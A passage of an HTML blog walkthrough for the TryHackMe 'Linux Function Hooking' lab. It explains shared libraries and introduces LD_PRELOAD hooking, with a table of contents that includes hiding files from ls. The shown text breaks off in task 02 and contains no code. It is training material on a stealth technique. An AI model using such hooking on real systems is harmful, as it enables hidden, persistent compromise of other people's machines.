<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>TryHackMe Linux Function Hooking &#183; Classroom</title><meta name=title content="TryHackMe Linux Function Hooking &#183; Classroom"><meta name=description content="TryHackMe Linux Function Hooking walkthrough — Learn about function hooking in Linux and have fun hooking functions"><meta name=keywords content="tryhackme,rooms,thm,"><link rel=canonical href=https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/><meta name=author content="Animesh Roy"><link href=https://twitter.com/anir0y rel=me><link href=https://github.com/anir0y rel=me><meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/"><meta property="og:site_name" content="Classroom"><meta property="og:title" content="TryHackMe Linux Function Hooking"><meta property="og:description" content="TryHackMe Linux Function Hooking walkthrough — Learn about function hooking in Linux and have fun hooking functions"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-07-18T02:30:10+05:30"><meta property="article:modified_time" content="2021-07-18T02:30:10+05:30"><meta property="article:tag" content="Tryhackme"><meta property="article:tag" content="Rooms"><meta property="article:tag" content="Thm"><meta name=twitter:card content="summary"><meta name=twitter:title content="TryHackMe Linux Function Hooking"><meta name=twitter:description content="TryHackMe Linux Function Hooking walkthrough — Learn about function hooking in Linux and have fun hooking functions"><meta name=twitter:image content="https://classroom.anir0y.in/img/cover.jpg"><meta property="og:image" content="https://classroom.anir0y.in/img/cover.jpg"><link type=text/css rel=stylesheet href=/css/main.bundle.min.2b25fd51aafe5a0a65545bce9bd61a30f10d3e06d3ee7763f9340e7b14b436599753c7638c95d4d05f1c440e6fd97fc28f2f1a2f19130b30f65434ddd920ebe3.css integrity="sha512-KyX9Uar+WgplVFvOm9YaMPENPgbT7ndj+TQOexS0NlmXU8djjJXU0F8cRA5v2X/Cjy8aLxkTCzD2VDTd2SDr4w=="><script type=text/javascript src=/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js integrity="sha512-b0EXSzoFtoCCD+CMrb+l+3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js integrity="sha512-vdp97ObLrwje730lT3+ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w==" data-copy=Copy data-copied=Copied></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"TryHackMe Linux Function Hooking","headline":"TryHackMe Linux Function Hooking","description":"TryHackMe Linux Function Hooking walkthrough — Learn about function hooking in Linux and have fun hooking functions","inLanguage":"en","url":"https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/","author":{"@type":"Person","name":"Animesh Roy","url":"https:\/\/classroom.anir0y.in\/about/me/"},"publisher":{"@type":"Organization","name":"Classroom","logo":{"@type":"ImageObject","url":"https:\/\/classroom.anir0y.in\/img/avatar.jpeg"}},"image":"https:\/\/classroom.anir0y.in\/img\/thm.png","copyrightYear":"2021","dateCreated":"2021-07-18T02:30:10\u002b05:30","datePublished":"2021-07-18T02:30:10\u002b05:30","dateModified":"2021-07-18T02:30:10\u002b05:30","keywords":["tryhackme","rooms","thm"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/"},"wordCount":"3599"},{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://classroom.anir0y.in/post/"},{"@type":"ListItem","position":2,"name":"TryHackMe Linux Function Hooking","item":"https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/"}]}]</script><script>(function(){var e=!1;function t(){if(e)return;e=!0;var n=document.createElement("script");n.src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3526678290068011",n.async=!0,n.crossOrigin="anonymous",document.head.appendChild(n),["scroll","click","touchstart"].forEach(function(e){window.removeEventListener(e,t,{capture:!0,passive:!0})})}["scroll","click","touchstart"].forEach(function(e){window.addEventListener(e,t,{capture:!0,passive:!0,once:!0})})})()</script></head><body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
Skip to main content</a></div><div class="main-menu flex items-center w-full gap-2 p-1 pl-0"><a href=/ class="text-base font-medium truncate min-w-0 shrink">Classroom</a><div class="flex items-center ms-auto"><div class="hidden md:flex"><nav class="flex items-center gap-x-5 h-12"><a href=/post/ class="flex items-center bf-icon-color-hover" aria-label=Posts title=Posts><span class="text-base font-medium break-normal">Posts
</span></a><a href=/categories/ class="flex items-center bf-icon-color-hover" aria-label=Categories title=Categories><span class="text-base font-medium break-normal">Categories
</span></a><a href=/tags/ class="flex items-center bf-icon-color-hover" aria-label=Tags title=Tags><span class="text-base font-medium break-normal">Tags
</span></a><a href=/archives/ class="flex items-center bf-icon-color-hover" aria-label=Archives title=Archives><span class="text-base font-medium break-normal">Archives
</span></a><a href=/about/me/ class="flex items-center bf-icon-color-hover" aria-label=About title><span class="text-base font-medium break-normal">About
</span></a><button id=search-button aria-label=Search class="text-base bf-icon-color-hover" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base bf-icon-color-hover"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav></div><div class="flex md:hidden"><div class="flex items-center h-14 gap-4"><button id=search-button-mobile aria-label=Search class="flex items-center justify-center bf-icon-color-hover" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile type=button aria-label="Dark mode switcher" class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400"><div class=dark:hidden><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="hidden dark:block"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button>
<input type=checkbox id=mobile-menu-toggle autocomplete=off class="hidden peer">
<label for=mobile-menu-toggle class="flex items-center justify-center cursor-pointer bf-icon-color-hover"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></label><div role=dialog aria-modal=true style=scrollbar-gutter:stable class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
bf-scrollbar"><label for=mobile-menu-toggle class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></label><nav class="mx-auto max-w-md space-y-6"><div class=px-2><a href=/post/ aria-label=Posts class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Posts class="text-2xl font-bold tracking-tight">Posts</span></a></div><div class=px-2><a href=/categories/ aria-label=Categories class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Categories class="text-2xl font-bold tracking-tight">Categories</span></a></div><div class=px-2><a href=/tags/ aria-label=Tags class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Tags class="text-2xl font-bold tracking-tight">Tags</span></a></div><div class=px-2><a href=/archives/ aria-label=Archives class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Archives class="text-2xl font-bold tracking-tight">Archives</span></a></div><div class=px-2><a href=/about/me/ aria-label=About class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title class="text-2xl font-bold tracking-tight">About</span></a></div></nav></div></div></div></div></div><script>(function(){var t,n,e=document.querySelector(".main-menu");if(!e)return;t=window.location.pathname,n=e.querySelectorAll('a[href="'+t+'"]'),n.forEach(function(e){var t=e.querySelectorAll("span");t.forEach(function(e){e.classList.add("active")})})})()</script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><div id=hero class="h-[150px] md:h-[200px]"></div><div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"><img id=background-image src=/img/thm_hu_ac8a16fd71d6b794.png role=presentation loading=eager decoding=async fetchpriority=high class="absolute inset-0 w-full h-full object-cover"><div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div><div class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div></div><div id=background-blur class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div><script type=text/javascript src=/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W+5DcKnbOMMOI+f7IvMGNsVvUfj+ooJ13n6EqqcGEz2FKMVvHLGwWPQ==" data-blur-id=background-blur data-image-id=background-image data-image-url=/img/thm_hu_ac8a16fd71d6b794.png></script><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/>Classroom</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/post/>Posts</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/post/tryhackme-linuxfunctionhooking/>TryHackMe Linux Function Hooking</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">TryHackMe Linux Function Hooking</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-07-18T02:30:10+05:30>18 July 2021</time><span class="px-2 text-primary-500">&#183;</span><span>3599 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">17 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/tryhackme/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">TryHackMe
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/tryhackme/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Tryhackme
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/rooms/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Rooms
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/thm/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Thm</span></span></a></div></div><div class="flex author"><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Animesh Roy</div><div class="text-sm text-neutral-700 dark:text-neutral-400">CTF walkthroughs, malware analysis, penetration testing, and security research.</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://twitter.com/anir0y target=_blank aria-label=Twitter title=Twitter rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645.0 138.72-105.583 298.558-298.558 298.558-59.452.0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055.0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421.0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391.0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04.0-57.828 46.782-104.934 104.934-104.934 30.213.0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/anir0y target=_blank aria-label=Github title=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs"><div class="toc ps-5 print:hidden lg:sticky lg:top-10"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#overview>OverView</a></li><li><a href=#task-01-introduction>task 01: Introduction</a></li><li><a href=#task-02-what-are-shared-libraries>task 02: What are Shared Libraries?</a><ul><li><a href=#21>2.1</a></li></ul></li><li><a href=#task-03-getting-a-tad-bit-technical>Task 03: Getting A Tad Bit Technical</a><ul><li><a href=#31>3.1</a></li><li><a href=#32>3.2</a></li><li><a href=#33>3.3</a></li></ul></li><li><a href=#task-04-putting-on-our-coding-hats>Task 04: Putting On Our Coding Hats</a><ul><li><a href=#41>4.1</a></li><li><a href=#42>4.2</a></li></ul></li><li><a href=#task-05-lets-gooooooooo>Task 05: Let&rsquo;s Gooooooooo</a><ul><li><a href=#compiling-our-program>Compiling Our Program</a></li><li><a href=#pre-loading-our-shared-object>Pre-Loading Our Shared Object</a></li><li><a href=#seeing-it-in-action>Seeing It In Action</a></li><li><a href=#51>5.1</a></li><li><a href=#52>5.2</a></li></ul></li><li><a href=#task-06-hiding-files-from-ls>task 06: Hiding Files From ls</a><ul><li><a href=#61>6.1</a></li></ul></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#overview>OverView</a></li><li><a href=#task-01-introduction>task 01: Introduction</a></li><li><a href=#task-02-what-are-shared-libraries>task 02: What are Shared Libraries?</a><ul><li><a href=#21>2.1</a></li></ul></li><li><a href=#task-03-getting-a-tad-bit-technical>Task 03: Getting A Tad Bit Technical</a><ul><li><a href=#31>3.1</a></li><li><a href=#32>3.2</a></li><li><a href=#33>3.3</a></li></ul></li><li><a href=#task-04-putting-on-our-coding-hats>Task 04: Putting On Our Coding Hats</a><ul><li><a href=#41>4.1</a></li><li><a href=#42>4.2</a></li></ul></li><li><a href=#task-05-lets-gooooooooo>Task 05: Let&rsquo;s Gooooooooo</a><ul><li><a href=#compiling-our-program>Compiling Our Program</a></li><li><a href=#pre-loading-our-shared-object>Pre-Loading Our Shared Object</a></li><li><a href=#seeing-it-in-action>Seeing It In Action</a></li><li><a href=#51>5.1</a></li><li><a href=#52>5.2</a></li></ul></li><li><a href=#task-06-hiding-files-from-ls>task 06: Hiding Files From ls</a><ul><li><a href=#61>6.1</a></li></ul></li></ul></nav></div></details><script>(function(){"use strict";const s=.33,o="#TableOfContents",i=".anchor",a='a[href^="#"]',r="li ul",c="active";let t=!1;function l(e,n){const o=window.scrollY+window.innerHeight*n,i=[...document.querySelectorAll('#TableOfContents a[href^="#"]')],s=new Set(i.map(e=>e.getAttribute("href").substring(1)));if(t)for(let t=0;t<e.length;t++){const n=e[t];if(!s.has(n.id))continue;const o=n.getBoundingClientRect().top+window.scrollY;if(Math.abs(window.scrollY-o)<100)return n.id}for(let t=e.length-1;t>=0;t--){const n=e[t].getBoundingClientRect().top+window.scrollY;if(n<=o&&s.has(e[t].id))return e[t].id}return e.find(e=>s.has(e.id))?.id||""}function e({toc:e,anchors:t,links:n,scrollOffset:s,collapseInactive:o}){const i=l(t,s);if(!i)return;if(n.forEach(e=>{const t=e.getAttribute("href")===`#${i}`;if(e.classList.toggle(c,t),o){const n=e.closest("li")?.querySelector("ul");n&&(n.style.display=t?"":"none")}}),o){const n=e.querySelector(`a[href="#${CSS.escape(i)}"]`);let t=n;for(;t&&t!==e;)t.tagName==="UL"&&(t.style.display=""),t.tagName==="LI"&&t.querySelector("ul")?.style.setProperty("display",""),t=t.parentElement}}function n(){const n=document.querySelector(o);if(!n)return;const l=!0,u=[...document.querySelectorAll(i)],d=[...n.querySelectorAll(a)];l&&n.querySelectorAll(r).forEach(e=>e.style.display="none"),d.forEach(e=>{e.addEventListener("click",()=>{t=!0})});const c={toc:n,anchors:u,links:d,scrollOffset:s,collapseInactive:l};window.addEventListener("scroll",()=>e(c),{passive:!0}),window.addEventListener("hashchange",()=>e(c),{passive:!0}),e(c)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",n):n()})()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="not-prose my-4 print:hidden"><div class=ad-container><ins class=adsbygoogle style=display:block data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188 data-ad-format=auto data-full-width-responsive=true></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div></div><div class="article-content max-w-prose mb-20"><h2 class="relative group">OverView<div id=overview class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#overview aria-label=Anchor>#</a></span></h2><table><thead><tr><th>Linux Function Hooking</th><th></th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/linuxfunctionhooking target=_blank rel=noreferrer>room</a></td><td><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=logo src=https://tryhackme-images.s3.amazonaws.com/room-icons/c0911c9d569c72aa687d73dce22a450a.png></figure></td></tr></tbody></table><hr><h2 class="relative group">task 01: Introduction<div id=task-01-introduction class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#task-01-introduction aria-label=Anchor>#</a></span></h2><p>In this room, we will be looking into what are Shared Libraries, what is Function Hooking and how we can leverage LD_PRELOAD to do the same! I have tried to keep this room as simple as possible, however some basic understanding of C will be definitely useful!</p><hr><h2 class="relative group">task 02: What are Shared Libraries?<div id=task-02-what-are-shared-libraries class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#task-02-what-are-shared-libraries aria-label=Anchor>#</a></span></h2><p>What Are Shared Libraries ?</p><p>Shared libraries are pre-compiled C-code which are linked during the final steps of producing an executable. They provide reusable features like functions, routines, classes, data structures, etc which can then be used while writing code of your own.</p><p>Common Shared Libraries which Linux Contains are :</p><ul><li>libc : The standard C library</li><li>glibc : GNU Implementation of standard libc</li><li>libcurl : Multiprotocol file transfer library</li><li>libcrypt : C Library to facilitate encryption, hashing, encoding etc</li></ul><p>The important thing to know about shared libraries is that they contain the addresses of various functions required by programs during runtime.</p><p>For example, when a dynamically linked executable issues a read() syscall, the system looks up the address of read() from the libc shared library. Now, libc has a well-defined definition for read() which specifies the number and type of function parameters and expects a particular type of data in return. Usually the system knows where to look for these functions, but as we will see later, we can control where the system looks for these functions and how we can leverage it for malicious purposes.</p><p><strong>TL;DR</strong>: Shared Libraries are basically compiled complied C codes that contains function definitions which can be later called to perform certain functions. When we run dynamically linked executables, the system looks up the definitions of common functions in these 